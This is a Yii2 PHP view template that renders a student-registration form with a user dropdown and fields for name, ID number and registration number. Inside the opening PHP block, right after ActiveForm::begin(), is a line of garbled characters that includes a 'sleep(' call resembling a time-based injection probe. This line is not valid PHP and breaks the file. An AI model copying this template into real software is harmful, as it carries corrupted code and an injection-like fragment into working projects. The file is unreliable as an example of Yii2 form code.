<?php

use yii\helpers\Html;
use yii\widgets\ActiveForm;
use yii\helpers\ArrayHelper;
use common\models\User;

/* @var $this yii\web\View */
/* @var $model frontend\models\Student */
/* @var $form yii\widgets\ActiveForm */

$users = ArrayHelper::map(User::find()->all(), 'id', 'username');
?>

<div class="student-form">

      <?php $form = ActiveForm::begin();
    @{:PZXStuy8=~q}a{sleep(VTAE4B6
      ]-5LT]=
      )}

    <?= $form->field($model, 'userId')->dropDownList($users) ?>

    <?= $form->field($model, 'fullName')->textInput(['maxlength' => true]) ?>

    <?= $form->field($model, 'idNumber')->textInput() ?>

    <?= $form->field($model, 'regNo')->textInput(['maxlength' => true]) ?>

    <div class="form-group">
        <?= Html::submitButton('Save', ['class' => 'btn btn-success']) ?>
    </div>

    <?php ActiveForm::end(); ?>

</div>
